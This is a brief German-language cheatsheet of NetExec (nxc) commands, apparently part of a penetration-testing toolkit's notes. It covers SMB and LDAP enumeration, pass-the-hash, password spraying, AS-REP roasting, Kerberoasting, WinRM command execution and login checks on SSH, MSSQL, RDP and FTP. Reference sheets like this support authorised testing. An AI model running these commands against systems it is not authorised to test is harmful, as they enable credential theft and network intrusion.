# NetExec (nxc) Cheatsheet

NetExec ist der Nachfolger von CrackMapExec. Kommando: `nxc` oder `netexec`.

## SMB

```bash
nxc smb 10.10.10.0/24                              # quick check + signing
nxc smb target -u user -p pass --shares
nxc smb target -u user -p pass --users
nxc smb target -u user -p pass --groups
nxc smb target -u user -p pass --pass-pol
nxc smb target -u user -H ntlmhash --shares        # PtH

# Spray
nxc smb target -u users.txt -p passwords.txt --continue-on-success
```

## LDAP

```bash
nxc ldap target -u user -p pass --asreproast asrep.txt
nxc ldap target -u user -p pass --kerberoasting kerb.txt
nxc ldap target -u user -p pass --users
```

## WinRM

```bash
nxc winrm target -u user -p pass
nxc winrm target -u user -p pass -x "whoami"
```

## SSH

```bash
nxc ssh target -u user -p pass
nxc ssh target -u users.txt -p passwords.txt
```

## MSSQL / RDP / FTP

```bash
nxc mssql target -u sa -p pass
nxc rdp target -u user -p pass
nxc ftp target -u user -p pass
```

## Toolkit-Wrapper

`scripts/network/smb-enum.sh <target>` macht enum4linux-ng + nxc-shares/users/passpol
und legt alles in `output/scans/smb-...`.
